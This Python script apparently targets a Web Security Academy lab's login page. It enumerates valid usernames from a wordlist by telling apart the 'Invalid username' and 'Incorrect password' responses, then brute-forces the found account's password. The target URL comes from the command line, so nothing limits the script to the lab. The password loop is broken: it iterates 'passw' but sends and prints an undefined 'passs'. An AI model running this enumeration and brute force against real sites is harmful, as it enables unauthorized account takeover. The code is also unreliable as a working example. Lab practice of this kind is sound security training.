#!/usr/bin/python3

from concurrent.futures import as_completed
from sys import argv

import requests
from requests_futures.sessions import FuturesSession

#url = "https://ac761f261ff80af080766ac2006c00a3.web-security-academy.net/"
url = argv[1]

with open("users.txt", 'r') as f:
	users = f.read().split()

with open("pass.txt", 'r') as f:
	passwords = f.read().split()
#print(users)

# with FuturesSession(max_workers=10) as session:
# 	for name in users:
# 		threads = [
# 					session.post(url + "login", data = {"username" : f"{name}", "password" :"a"})
# 		]
		
# 		#dat = dict(zip(users, (thread.result().text for thread in threads)))
		
# 		#if not "Invalid username" in dat.values():
# 			#print(dat[dat.()])

# 		print([thread.result().text for thread in threads if "Invalid username" in thread.result().text])

for name in users:
	r = requests.post(url + "login", data = {"username" : f"{name}", "password" :"a"})

	if "Invalid username" not in r.text:
		print(f"Username{name}")
		user = name
		break

for passw in passwords:
	r = requests.post(url + "login", data = {"username" : f"{user}", "password" : f"{passs}"})

	if "Incorrect password" not in r.text:
		print(f"password{passs}")
		break

